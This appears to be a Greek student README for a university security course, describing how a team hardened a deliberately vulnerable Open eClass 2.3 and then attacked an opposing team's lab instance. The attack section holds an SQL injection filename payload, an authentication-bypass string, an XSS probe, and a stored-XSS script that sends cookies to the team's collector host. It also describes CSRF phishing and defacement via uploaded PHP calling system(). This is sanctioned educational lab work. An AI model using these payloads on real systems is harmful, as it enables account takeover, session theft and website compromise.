## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://ys13.chatzi.org/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


### Χρήση μέσω docker
```
# create and start (the first run takes time to build the image)
docker-compose up -d

# stop/restart
docker-compose stop
docker-compose start

# stop and remove
docker-compose down -v
```

To site είναι διαθέσιμο στο http://localhost:8001/. Την πρώτη φορά θα πρέπει να τρέξετε τον οδηγό εγκατάστασης.


### Ρυθμίσεις eclass

Στο οδηγό εγκατάστασης του eclass, χρησιμοποιήστε __οπωσδήποτε__ τις παρακάτω ρυθμίσεις:

- Ρυθμίσεις της MySQL
  - Εξυπηρέτης Βάσης Δεδομένων: `db`
  - Όνομα Χρήστη για τη Βάση Δεδομένων: `root`
  - Συνθηματικό για τη Βάση Δεδομένων: `1234`
- Ρυθμίσεις συστήματος
  - URL του Open eClass : `http://localhost:8001/` (προσοχή στο τελικό `/`)
  - Όνομα Χρήστη του Διαχειριστή : `drunkadmin`

Αν κάνετε κάποιο λάθος στις ρυθμίσεις, ή για οποιοδήποτε λόγο θέλετε να ρυθμίσετε
το openeclass από την αρχή, διαγράψτε το directory, `openeclass/config` και ο
οδηγός εγκατάστασης θα τρέξει ξανά.

## 2022 Project 1

Εκφώνηση: https://ys13.chatzi.org/assets/projects/project1.pdf


### Μέλη ομάδας

- 1115201800083, Φίλιππος Κουμπάρος
- 1115201800164, Ιωάννης Ροβιθάκης

___

## Μέρος 1ο, διόρθωση ευπαθειών:

Προκειμένου να ασφαλίσουμε τον ιστότοπο, εστιάσαμε κυρίως στις ευπάθειες που μας ενδιαφέρουν σε αυτή την εργασία. Συγκεκριμένα δηλαδή SQL Injection, Cross-site Scripting (XSS), Cross-Site Request Forgery (CSRF) και Remote File Injection (RFI). Ανατολικότερα, για κάθε ευπάθεια κάναμε τα εξής:

### SQL Injection

Με σκοπό να μπορούν query στην βάση δεδομένων που χρησιμοποιούν ορίσματα από τον χρήστη να γίνουν με ασφάλεια αποφασίσαμε να χρησιμοποιήσουμε prepared statement, μιας και καθιστούν το injection από κάποια μεταβλητή αδύνατο, αφού οι μεταβλητές δίνονται και εκτελούνται ξεχωριστά από το query. Στην PHP βρήκαμε δυο τρόπους να χρησιμοποιήσουμε prepared statement για MySQL, με χρήση της MySQLi και PDO. Προτιμήσαμε τον τρόπο των PDO, και υλοποιήσαμε την συνάρτηση db_query_safe(). Περιληπτικά σε αυτή δίνονται το query, και ένας πινάκας με τα ορίσματα που θα γίνουν bind στο query. Μπορούν ακόμα να δοθούν, το όνομα της βάσης που θα χρησιμοποιηθεί, και το αν θα επιστραφεί το connection με την βάση ή το ίδιο το statement. Τα τελευταία ήταν χρήσιμα προκειμένου κάποιες deprecated συναρτήσεις όπως η mysql_fetch_array() να αντικατασταθούν από νέες, συμβατές με τα PDO.

Με την χρήση της συνάρτησης  db_query_safe pachαραμε τα εξής σημεία που θεωρήσαμε ευπαθή για sql injection:


**index.php**

- Χρησιμοποιήθηκε PDO prepared statment, για το login. Για λόγους ευστάθειας της εφαρμογής δεν μπορούσε να γίνει χρήση της  db_query_safe().


**modules/admin/addfaculte.php**

- Χρησιμοποιήθηκε η  db_query_safe(), κατ επέκταση PDO prepared statment για τα INSERT (γραμμή 174), SELECT (γραμμές 236, 267) και UPDATE (γραμμές 248, 251, 257).


**modules/admin/adminannouncements.php**

- db_query_safe() για τα INSERT (γραμμές 132), και UPDATE (γραμμή 118).


**modules/admin/newuseradmin.php**

- db_query_safe() για τα INSERT (γραμμή 97).


**modules/auth/lostpass.php**

- db_query_safe() για τα INSERT (γραμμή 160), SELECT (γραμμή 140) και UPDATE (γραμμή 161).


**modules/auth/newprof.php**

- db_query_safe() για τα INSERT (γραμμή 165).


**modules/auth/newuser.php**

- db_query_safe() για τα INSERT (γραμμή 227), SELECT (γραμμή 217).


**modules/course_info/infocours.php**

- db_query_safe() γραμμές 120 μέχρι 186 τα συνεχόμενα UPDATE query.


**modules/create_course/create_course.php**

- db_query_safe() για τα INSERT (γραμμές 397, 421, 433), SELECT (γραμμή) και UPDATE (γραμμή).


**modules/dropbox/dropbox_class.inc.php**

- db_query_safe() για τα INSERT (γραμμές 171, 201, 322, 329).


**modules/phpbb/newtopic.php**

- db_query_safe() για τα INSERT (γραμμές 157, 168, 181), SELECT (γραμμές ) και UPDATE (γραμμές 190, 200).


**modules/unreguser/unregcours.php**

- db_query_safe() για το DELETE με SELECT γραμμή 70.


**modules/work/work.php**

- db_query_safe() για τα INSERT (γραμμή 369).

**modules/phpbb/reply.php**

- Δύο (γραμμές 90, 97) db_query_safe() για τα SELECT που εκτελούντουσαν στην γραμμή 102.

### Cross-site Scripting (XSS)

Για την αντιμετώπιση ευπαθειών τύπου XSS, χρησιμοποιήσαμε την συνάρτηση htmlspecialchars() της php με την
επιλογή ENT_QUOTES, ώστε να αποτρέψουμε κώδικά κακόβουλων χρηστών να μπορεί να φορτωθεί και να εκτελεστεί 
σε κάποια από τις ιστοσελίδες του open eclass. Ανάλογα την περίπτωση και τον τρόπο με τον οποίο λειτουργεί
ο κώδικας της κάθε σελίδας, χρησιμοποιήσαμε την htmlspecialchars() τόσο στο input του χρήστη στις διαφορες φόρμες
της πλατφόρμας όσο και κατα την φόρτωση τιμών διαφόρων πεδίων σελιδών μεσω url (πχ στην σελίδα δημιουργίας νέου χρήστη
παρατηρήσαμε από τον κώδικα της σελίδας οτι ήταν δυνατό να δωθούν τιμές πεδίων της φόρμας από το url, γεγονός που επέτρεπε
την εκτέλεση κώδικα). Προσπαθήσαμε να προστατεύσουμε με τον παραπάνω τρόπο όλες τις φόρμες που μπορεσαμε
να εντοπίσουμε στην πλατφόρμα, καθώς και όλες τις παραμέτρους που εντοπίσαμε πως μπορούν να τροποποιηθούν κακόβουλα μέσω url.
Σε γενικές γραμμές, προσπαθήσαμε να καλύψουμε Stored XSS και Reflected XSS vunerabilities σε όλα τα σημεία που τα εντοπίσαμε.
Οι προσθήκες και τροποποιήσεις που κάναμε για την αντιμετώπιση XSS ευπαθειών είναι σχετικά εκτενείς και κατά συνέπεια αποφασίσαμε
να μην προσθέσουμε αναλυτική λίστα τους στο παρόν README αρχειο, μπορείτε όμως να τις δείτε αναλυτικά στα commits του παρόντος 
repository.

Σημείωση: Όσον αφορά την εισαγωγή κακόβουλων τιμών μέσω url, μελετώντας τον κώδικα, παρατηρήσαμε πως, η χρήση της intval() σε συνδυασμό με 
if cases με συγκεκριμένα strings δεκτά, φαίνεται να επαρκούν για να αποτρέψουν/δυσκολέψουν σημαντικά τέτοιου τύπου επιθέσεις.

### Cross-Site Request Forgery (CSRF)

Οι ευπάθεις CSRF αφορούν την χρήση "πειραγμένων" links που αποστέλονται από κακόβουλους χρήστες τα οποία εκμεταλλεύονται το 
γεγονός ότι ένας χρήστης-θύμα είναι πιθανόν συνδεδεμένος ταυτόχρονα σε διάφορες ιστοσελίδες, και στέλνουν κακόβουλες "εντολές"
σε στην πλατφόρμα "στόχος", φαινομενικά από τον λογαριασμό του θύματος, εφόσον αυτός πατήσει τον κακόβουλο σύνδεσμο. 
Η μέθοδος που χρησιμοποιήσαμε για να αντιμετωπίσουμε επιθέσεις τύπου CSRF είναι η χρήση anti-forgery tokens. Με λίγα λόγια, προσθέσαμε
σε κάθε φόρμα της πλατφόρμας ένα επιπλέον κρυφό token, το οποίο αποστέλεται μαζί με τα δεδομένα της φόρμας στον server όταν
ο χρήστης κάνει submit, και σε περίπτωση που το token αυτό δεν είναι έγκυρο, το submit της φορμας αυτό θεωρείται άκυρο και αγνοείται
από τον σέρβερ.

Πιο αναλυτικά, όταν ένας χρήστης ζητάει από τον σερβερ μια σελίδα που περιέχει κάποια φόρμα, ο σερβερ δημιουργεί ένα προσωρινό τυχαίο όνομα
για την φόρμα αυτή, και με βάση το όνομα αυτό ως seed, παράγει και ένα κρυφό token και εισάγει τα δύο αυτά στοιχεία στη φόρμα που στέλνει τελικά 
στον χρήστη για να συμπληρώσει. Όταν ο χρήστης υποβάλει την φόρμα, το όνομα της φόρμας καθώς και το token αποστέλονται πίσω στον σερβερ μαζί
με τα δεδομένα της φόρμας. Στο σημείο αυτό, ο σερβερ χρησιμοποιεί πάλι το προσωρινό τυχαίο όνομα της φόρμας ως seed για να δημιουργήσει 
το token εκ νέου. Σε περίπτωση που το token που απεστάλει μαζί με τη φόρμα είναι διαφορετικό με το τόκεν που παράχθηκε, ο σερβερ αγνωεί το 
request ως κακόβουλο. Η μέθοδος αυτή είναι ιδιαίτερα αποτελεσματική, τουλάχιστον όσο ο αντίπαλος  δεν γνωρίζει το hash function που 
χρησιμοποιεί ο σερβερ.

Προστατεύσαμε το open eclass από CSRF επιθέσεις, με την προσθήκη του αρχείου anticsrf.php, στο αρχείο basetheme.php το οποίο γίνεται include 
σε όλες τις σελίδες της πλατφόρμας. Το αρχείο αυτό είναι βασισμένο σε κώδικα που βρήκαμε στο OWASP κατα την διάρκεια έρευνας μας πάνω στους
τρόπους αντιμετώπισης CSRF επιθέσεων (https://wiki.owasp.org/index.php/PHP_CSRF_Guard), με μικρές τροποιήσεις (προσθήκη δικής μας συνάρτησης
για hashing καθώς και μια υλοποίηση της hash_equals() συνάρτησης https://stackoverflow.com/questions/32671908/hash-equals-alternative-for-php-5-5-9
καθώς η hash equals δεν ειναι διαθέσιμη στην έκδοση της php με την οποία δουλεύουμε). Επιλέξαμε να χρησιμοποιήσουμε την παρούσα υλοποίηση 
του anticsrf.php καθώς έχει την δυνατότητα να "εισάγει" αυτόματα τα anti forgery names+tokens στις διαφορες φόρμες μιας σελίδας, γεγονός
που κάνει την λύση μας ιδιαίτερα "καθαρή" καθώς μια λύση επηρεάζει το σύνολο του κώδικά μας, και δεν χρειαζεται να προστατευτεί η κάθε φόρμα
ξεχωριστά, γεγονός που εκμηδενίζει την πιθανότητα ανθρωπίνου λάθους.

### Remote File Injection (RFI)

Μια επίθεση RFI ουσιαστικά είναι η εκτέλεση ενός κακόβουλου αρχείου από κάποιον χρήστη. Εντοπίσαμε τρόπους με τους οποίους αυτό μπορεί να γίνει και κάναμε τα εξής:

- Αλλαγή ονομάτων αρχείων. Εντοπίσαμε δυο σημεία από τα οποία ο χρήστης μπορεί να ανεβάσει κάποιο αρχείο. Την ανταλλαγών αρχείων και την υποβολή μιας εργασίας, έτσι:
    - Πρώτον, αλλάξαμε τα ονόματα των αρχείων όταν αποθηκεύονται τοπικά στο server. Δημιουργώντας τυχαία και με βάση το αρχικό όνομα του αρχείου με *(έναν (επίτηδες) ίσως ανορθόδοξο τρόπο)* χρήση της συνάρτησης filename_chiper(). Κάτι που σε συνδυασμό με το μπλοκάρισμα του χρηστή στην περιήγηση στον server, καθιστά θεωρητικά αδύνατο να βρεθεί το κακόβουλο αρχείο που τοποθέτησε και *(θα)* ήθελε να χρησιμοποιήσει. 
    - Ακόμα, σαν μια δεύτερη γραμμή άμυνας, όλα τα αρχεία στην ανταλλαγή αρχείων και στην υποβολή της εργασίας αποκτούν την κατάληξη .txt, έτσι ακόμα και αν ο επιτιθέμενος βρεί το αρχείο του, αυτό δεν θα εκτελεστεί από τον server.
	Πρέπει να σημειωθεί ότι τα παραπάνω δεν επηρεάζουν την διαδικασία υποβολής και λήψης του αρχείου, καθώς το αρχικό όνομα του αποθηκεύετε  και ανακτάτε από την ΒΔ. 
 

- Whitelist γλωσσών. Επίσης, ο δεύτερος τρόπος με τον οποίο εντοπίσαμε ότι μπορεί να γίνει μια επίθεση RFI ξεκινούσε από τον τρόπο με τον οποίο είναι σχεδιασμένο το open eclass. Αφού επιτρέπει σε κακόβουλους χρήστες μέσω της τροποποίησης των επιλογών των γλωσσών να 
αποκτούν πρόσβαση και να εκτελούν αρχεία στα οποία δεν θα έπρεπε να έχουν πρόσβαση. Ένα παράδειγμα είναι το εξής:

include("${webDir}modules/lang/$language/common.inc.php");

Είναι προφανές οτι με την "σωστή" τιμή, η μεταβλητή $language μπορεί να οδηγήσει στην εκτέλεση κακόβουλου κώδικα στην ιστοσελίδα.

Ο τρόπος που αντιμετωπίσαμε την παραπάνω ευπάθεια, είναι η δημιουργία μιας whitelist γλωσσών, η οποία επιτρέπει στις μεταβλητές που 
αφορούν τις γλώσσες να έχουν αποκλειστικά και μόνο μία απο τις επιτρεπτές τιμές και τίποτα άλλο, με αποτέλεσμα να μην μπορεί ο κακόβουλος
χρήστης να τροποποιήσει για παράδειγμα κάποιο include path.


### Σημειώσεις

1. Στην διαδικασία της προστασίας του open eclass, θελήσαμε να ενεργοποιήσουμε επιπλέον ρυθμίσεις ασφαλείας στον apache server όπως τα 
   SameSite cookies, αλλά αυτό δεν ήταν δυνατό τελικά, καθώς δεν καταφέραμε να τροποιήσουμε τα απαραίτητα αρχεία εσωτερικά του docker, 
   ενώ η έκδοση της php που χρησιμοποιείται δεν υποστηρίζει την ρύθμιση για SameSite.

2. Ιδανικά, θα θέλαμε να αναβαθμίσουμε την έκδοση της php του open eclass σε μια πιο πρόσφατη, ώστε να έχουμε διαθέσιμες όλες τις 
   σύγχρονες επιλογές ασφαλείας και συναρτήσεις διαθέσιμες.

3. Προκειμένου να πετύχουμε πιο αποτελεσματικά τον σκοπό της εργασίας, δηλαδή την “θωράκιση” των λειτουργιών του open eclass. Πήραμε την πρωτοβουλία και *(ύστερα από σχετική ερώτηση)* “κλείσαμε” κάποιες σελίδες που δεν πρόσφεραν κάτι χρήσιμο στις ζητούμενες λειτουργίες της εργασίας, άλλα δημιουργούσαν **σημαντικές** ευπαθείς στο σύνολο της εφαρμογής. *Προσπαθήσαμε αυτό το “κλείσιμο” μη απαραιτήτων σελίδων στα πλαίσια της εργασίας, να γίνει με τον πιο “εύθυμο” τρόπο.*

4. Θα δείτε ένα commit μετά το deadline του στησίματος της εφαρμογής, που ενεργοποιεί την λειτουργιά  τροποποίησης χρήστη. Αυτό έγινε μετά από έκκληση των αντιπάλων/συναδέλφων μας σχετικά με απενεργοποιημένες λειτουργίες, και με σκοπό να τους βοηθήσουμε επαναφέραμε την εν λόγω λειτουργιά.


## Μέρος 2ο, επίθεση:


### SQL Injection

Αρχικά δοκιμάσαμε SQL injection σε όλα τα πιθανά πεδία που ξέραμε ότι είναι ευάλωτα από την διαδικασία “ασφάλισης” της δικιάς μας εργασίας. Δεν βρήκαμε κάποιο σημείο που με χρήση SQL injection θα μπορούσαμε να αλλάξουμε τα δεδομένα της βάσης, Βρήκαμε όμως σημεία όπου μπορούμε να “πειράξουμε” SELECT queries, και συγκεκριμένα ακόμα και να γράψουμε όλο δικά μας SELECT query. Το σημαντικότερο ήταν στην υποβολή εργασίας, όπου πεδία όπως τα σχόλια φαίνονται να υποστείτε απλό escape, και δεν χρησιμοποιείτε prepare statement. Στην ίδια σελίδα όμως, το όνομα του αρχείου δεν πρέπει να περνάει ούτε από κάποιο escape, και έτσι σε αυτό μπορούμε να εμφολευσουμε οποιοδήποτε SELECT query θέλουμε στο υπάρχον query.

Τo query που γίνεται στην υποβολή εργασίας είναι το έξης:

`INSERT INTO assignment_submit (uid, assignment_id, submission_date, submission_ip, file_path, file_name, comments) VALUES (....)`

Συνεπώς, έχοντας ένα αρχείο με όνομα ` 'SQL_inject' , (SELECT eclass.user.password FROM eclass.user WHERE eclass.user.user_id = 1) ) -- ' `  το παραπάνω query θα τοποθετήσει τον hashed κωδικό του admin στα σχόλια της υποβολής μας. To hash του κωδικού είναι *3a472d3dc4891ab7307988cdf00786df* και ήταν περίπλοκος και δεν τον
βρήκαμε σε κάποια βάση με hashes το διαδίκτυο. Επαναλαμβάνοντας το παραπάνω injection για δικό μας χρήστη του οποίου γνωρίζαμε τον κωδικό επιβεβαιώσαμε ότι ο κωδικός
δεν ήταν salted. Παρόλα αυτά, με το md5 hashrate της gpu που είχαμε διαθέσιμη υπολογίσαμε πως θα έπαιρνει περίπου 150 μέρες για να σπάσει το hash με bruteforce.

Ιδανικά θα θέλαμε έκτος από το SELECT query που γίνεται σε αυτό το σημείο να εκτελέσουμε και (ή μόνο) ένα δικό μας UPDATE ή INSERT query. Το παραπάνω θα μας επέτρεπε να 
αλλάξουμε τον κωδικό του admin και να συνδεθούμε. Κάτι τέτοιο όμως δεν είναι εφικτό, καθώς το query *(λογικά)* θα εκτελείτε με χρήση της mysql_query *(όπως και στο σύνολο της εφαρμογής)*, η οποία δεν υποστηρίζει την εκτέλεση πολλών query, εξού και η ανάγκη χρήσης εμφολευμένου SELECT για να μπορέσουμε να εκμεταλλευτούμε αυτό το κενό ασφαλείας.

Τελικά, καταφέραμε να βρούμε ένα SQLi στη σελίδα 'upgrade' στην φόρμα authentication του admin το οποίο **μας επέτρεψε να συνδεθούμε ως admin** και να έχουμε πρόσβαση 
στις σελίδες/επιλογές του. Πιο αναλυτικά, παρατηρήσαμε οτι τα πεδία της φόρμας γινονταν escape αντί να χρησιμοποιηθεί κάποιο prepared statement, οπότε μετά από αρκετές δοκιμές και συνδυασμούς ' και " μετά το username, καταλήξαμε στο ```drunkadmin' or ''='``` το οποίο και μας επέτρεψε να προσπεράσουμε τον έλεγχο του κωδικού και να
συνδεθούμε με επιτυχία.


### XSS

Όσον αφορά τα XSS vunerabilities, οι αντίπαλοι μας φαίνεται να έκαναν πολύ καλύ δουλειά στην αντιμετώπισή τους, καθώς καμία από τις επιθέσεις XSS που κάναμε δεν λειτούργησε,
Δοκιμάσαμε ακόμα και τα πιο "κρυμμένα" XSS όπως αυτα που μπορούν να προκύψουν από το ```$_SERVER ['PHP_SELF']``` και ήταν όλα επαρκώς προστατευμένα. Ακόμα και "ύπουλα"
σχεδιασμένες σελίδες όπως η newuser.php newprof.php στις οποίες μπορούσαμε στο πρωτότυπο να κάνουμε inject xss στα πεδία της φόρμας απλά γράφοντας το script μας στο url 
σαν τιμή μιας από τις php μεταβλητές που δίνουν value σε κάποιο από τα πεδία της σελίδας, ήταν επαρκώς προστατευμένες. 

πχ το ```http://madclip-enthusiasts.csec.chatzi.org/modules/auth/newuser.php?prenom_form=%27%3Cscript%3Ealert(1)%3C/script%3E```

φαίνεται να "σπάει" την φόρμα, καθώς τυπώνεται το εξής ```alert(1)' class='FormData_InputText' />  (*)``` αλλά δεν τρέχει τελικά ο κώδικας καθώς φαίνεται να 
αφαιρούν από τα strings τους χαρακτήρες '<', '>', '/', και την λέξη 'script'

Πέρα από τα παραπάνω, δοκιμάσαμε σε όλα τα σημεία της πλατφόρμας που μπορέσαμε να σκεφτούμε επιθέσεις stored xss βάζοντας το εξής script 
```<script>window.location='http://edimoi-diariktes.puppies.chatzi.org/?totally_not_suspicious='.concat(document.cookie);</script>```
το οποίο εαν εκτελεστεί, αποστέλει το cookie του χρήστη στην σελίδα puppies μας από την οποία το cookie αποστέλεται αυτόματα με email σε εμάς.
"Φυτέψαμε" το script αυτό σε όλα τα σημεία που μπορέσαμε να σκεφτούμε και δοκιμάσαμε να στείλουμε email στον drunkadmin ζητώντας του "Να μπει να
βαθμολογήσει τις εργασιες μας" ή "Να διαβάσει τα μηνύματά μας" με την ελπίδα ότι κάποιο xss θα έτρεχε στην πλευρά του admin, πράγμα όμως που δεν
έγινε τελικά καθώς οι αντίπαλοι μας είχαν προστατεύσει τις σελίδες αυτές όπως αποδείχθηκε.


### RFI

Αρχικά ξεκινήσαμε ψάχνοντας σημεία όπου θα μπορούσαμε να κάνουμε RFI. Το οποίο θα μας έδινε την δυνατότητα να εκτελέσουμε τα δικά μας, κακόβουλα αρχεία php.

Το πρώτο ήταν η γλωσσά, όπου δοκιμάσαμε να βάλουμε κάποιες invalid τιμές για αυτή με σκοπό να εκτελέσουμε  κάποιο άλλο αρχείο.  Αυτό δεν ήταν δυνατό καθώς κάθε τέτοια προσπάθεια μας είχε σαν αποτέλεσμα να κάνει default η γλώσσα στα αγγλικά.

Εν συνεχεία προσπαθήσαμε να δούμε αν μπορούμε να εκμεταλλευτούμε με κάποιον τρόπο την ανταλλαγή αρχείων και την υποβολή εργασίας. Παρόλο που μπορούσαμε να βρούμε την ακριβή τοποθεσία των αρχείων *(αφού δεν άλλαζαν τα ονόματα των αρχείων, άλλα είχαμε και πρόσβαση στην βάση με χρήση του πρώτου μας injection)* και μπορούσαμε να ανεβάσουμε μέχρι και .php αρχεία. Μια τέτοια είδους επίθεση είχε αδρανοποιηθεί στο site τον αντιπάλων μας, αφού η διαδικασία λήψης των αρχείων είχε αλλάξει, και απλά στελνόντουσαν στον browser όπου και κατεβαίναν στον υπολογιστή μας, χωρίς να εκτελούνται ποτέ στον server. Αλλά και κανένας *(εκτός από την ίδια την php)* δεν είχε πρόσβαση στο αρχείο όπως αυτό είναι αποθηκευμένο στον server.

Σαν τελευταία προσπάθεια χρησιμοποιήσαμε μια λειτουργιά στην ενότητα “ενεργοποίηση εργαλείων” ενός μαθήματος, το “Ανέβασμα ιστοσελίδας” *(Στην οποία και είχαμε πρόσβαση όταν αποκτήσαμε τον κωδικό του drunk admin)*. Η λειτουργιά αυτή ουσιαστικά επιτρέπει σε έναν εκπαιδευτή να ανεβάσει την δικιά του σελίδα στον server, με αποτέλεσμα αυτή να εκτελείτε στον server. Αυτό αποτελούσε μια πολύ σημαντική ευπάθεια καθώς συνδυαστικά με την χρήση της συνάρτησης system() της php, έχουμε την δυνατότητα να τρέξουμε οποιαδήποτε εντολή θέλουμε στον server, αρκεί ο χρήστης του apache να έχει δικαίωμα να την εκτελέσει. **Αν** για παράδειγμα ο χρήστης αυτός είχε δικαιώματα root, θα μπορούσαμε μέχρι και να φτιάξουμε έναν δικό μας χρήστη στον server και να κάνουμε ssh. Αλλά αφού ο χρήστης για τον apache δεν έχει τέτοια δικαιώματα δοκιμάσαμε κάτι πιο “προσγειωμένο”. Ανεβάσαμε ένα δικό μας index.php στον server, και με χρήση της system() αντικαταστήσαμε το κανονικό index.php της εφαρμογής *(το αρχικό index.php το κρατήσαμε σε ένα αρχείο oldindex.php)*, **κάνοντας ουσιαστικά defacement την ιστοσελίδα των αντιπάλων** *(το οποίο έχουμε και claim)*.

*Συνολικά, οι αντίπαλοι φαίνεται να είχαν κλείσει σχεδόν όλα τα πιθανά σημεία για RFI, μιας και η λειτουργιά “Ανέβασμα ιστοσελίδας” ήταν από την πλευρά του καθηγητή, και σε καθόλου εμφανές σημείο.*


### CSRF

Στείλαμε emails στον drunkadmin με ενα πειστικό back-story ώστε να τον οδηγήσουμε στην σελίδα μας και να τον κάνουμε να πατήσει τα αντίστοιχα κουμπιά,
τα οποία έκαναν submit κρυμμένες φόρμες από μέρους του, με σκοπό να αλλάξουμε πχ τον κωδικό του ή να δημιουργήσουμε κάποιον άλλο admin. Οι επιθέσεις αυτές 
δεν λειτούργησαν καθώς απ ότι φαίνεται οι αντίπαλοι μας είχαν προστατεύσει τις φόρμες τους με τα απαραίτητα anticsrf tokens.
Μπορείτε να δείτε τον κώδικα/φόρμες που χρησιμοποιήσαμε για τις csrf επιθέσεις στην puppies σελίδα μας σε αυτό το repository. Τα csrf αυτά λειτουργούσαν κανονικά
στην αρχική-ευάλωτη έκδοση του eclass από την οποία ξεκινήσαμε, οπότε συμπεράναμε οτι για να μην λειτούργησαν ενώ ο drunkadmin πατησε το submit 
πρέπει να τα προστάτεψαν οι αντίπαλοι.


### Puppies

Θέλοντας να αποκτήσουμε access σαν drunk admin στο site των αντιπάλων στήσαμε μια δικιά μας σελίδα στην θέση των puppies *(μπορείτε να δείτε τον κώδικα αυτής στο repository)*. Πιο συγκεκριμένα η ιστοσελίδα puppies εξυπηρετεί τους έξεις σκοπούς. Πρώτον, έχει κουμπιά στα οποία όταν πατήσει ο χρήστης, κάνει ένα csrf attack με σκοπό να γίνει submit μια φόρμα από τον drunkadmin *(πχ αλλαγή κωδικού)*. Ακόμα έχει έναν URL listener από τον οποίο αναμένει να παραλάβει να πάρει το cookie κάποιου χρήστη. Επίσης για δικιά μας διευκόλυνση, κάναμε την σελίδα να μας στέλνει ένα email όταν κάποιος μπαίνει σε αυτή, μαζί με όποιο payload μπορεί να κατάφερε να αποσπάσει από τον χρήστη καθώς και τον browser που χρησιμοποίησε ο χρηστης, καθώς παρατηρήσαμε ότι αναφορικά με τα csrf attack ο mozzila firefox είχε διαφορετική, πιο ευνοϊκή για εμάς διαχείριση του samesite tag coockie όταν αυτό δεν έχει οριστεί, σε αντίθεση με τους chromium based browsers. Με χρήση της σελίδας αυτής λοιπόν και αποστολής email στον drunkadmin, προσπαθήσαμε να κάνουμε δυο csrf attacks, ένα για να αλλάξουμε τον κωδικό του drunkadmin, και να φτιάξουμε έναν δικό μας καθηγητή *(φόρμες http://localhost:8001/modules/admin/password.php?userid=1 και http://localhost:8001/modules/admin/newuseradmin.php αντίστοιχα)*. *Για κακη μας όμως τύχη, ως αποτέλεσμα της καλής δουλειάς της αμυνόμενης ομάδας, και τα δυο αυτά attacks απέτυχαν*.

